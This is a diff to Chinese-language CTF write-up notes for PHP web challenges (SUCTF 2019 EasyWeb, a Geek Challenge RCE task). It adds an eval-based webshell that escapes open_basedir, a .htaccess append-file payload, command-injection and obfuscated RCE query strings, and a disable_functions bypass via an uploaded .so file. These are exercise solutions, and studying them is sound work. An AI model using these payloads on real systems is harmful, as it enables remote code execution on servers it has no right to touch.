@@ -54,8 +54,6 @@ if (isset($_GET['get_flag'])){
 
 payload`fl4g.php?num=1e10&md5=0e215962017&get_flag=tac%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag`
 
-
-
 ## [SUCTF 2019]EasyWeb
 
 ```php
@@ -183,7 +181,7 @@ GIF89a
 ```php
 \0GIF89a
 AddType application/x-httpd-php .asdf
-php_value auto_prepend_file "php://filter/read=convert.base64-decode/resource=a.asdf"
+php_value auto_append_file "php://filter/read=convert.base64-decode/resource=a.asdf"
 ```
 
 ```python
@@ -234,6 +232,79 @@ print(requests.get(url=payload).text)
 ```
 
 ![image-20210429155351589](image-20210429155351589.png)
+
+在`html`目录下得到一个`F1AghhhhhhhhhhhhhHH`文件
+
+![image-20210501145851297](image-20210501145851297.png)
+
+尝试读取父级目录,发现无法读取,可能存在`open_basedir`限制,检查phpinfo得知
+
+`open_basedir	/var/www/html/:/tmp/	/var/www/html/:/tmp/`
+
+直接在`html`目录下新建一个webshell即可,内容如下
+
+```php
+<?php
+chdir('/tmp');
+mkdir('/tmp/test');
+chdir('/tmp/test');
+ini_set('open_basedir','..');
+chdir('..');
+chdir('..');
+chdir('..');
+chdir('..');
+ini_set('open_basedir','/');
+@eval($_POST['a']);
+?>
+```
+
+将`open_basedir`切换到`/`即可对位于根目录的flag进行读取
+
+![image-20210501160925010](image-20210501160925010.png)
+
+---
+
+也可以根据提示`But I heard php7.2-fpm has been initialized in unix socket mode!`来读取flag
+
+https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF%202019%20Easyweb.md
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -411,16 +482,6 @@ for i in s:
 print(url)
 ```
 
-
-
-
-
-
-
-
-
-
-
 ## [极客大挑战 2019]RCE ME
 
 > 类似于无参数RCE
@@ -481,3 +542,16 @@ payload`?code=(~%9E%8C%8C%9A%8D%8B)((~%9A%91%9B)((~%98%9A%8B%9E%93%93%97%9A%9E%9
 `readfile("/readflag");`有回显
 
 说明`/flag`无法直接读取
+
+![image-20210501215919628](image-20210501215919628.png)
+
+![image-20210501215943333](image-20210501215943333.png)
+
+剩下的步骤就跟新生赛那题差不多了
+
+将`bypass.so`文件和`bypass.php`文件上传到`/tmp`目录下(html目录没有可写权限),然后再对`bypass.php`进行include即可getflag
+
+![image-20210501223248965](image-20210501223248965.png)
+
+也可以直接用蚁剑`bypass_disable_function`模块的`GC_UAF`模式或者`Backtrace UAF`模式来执行shell
+
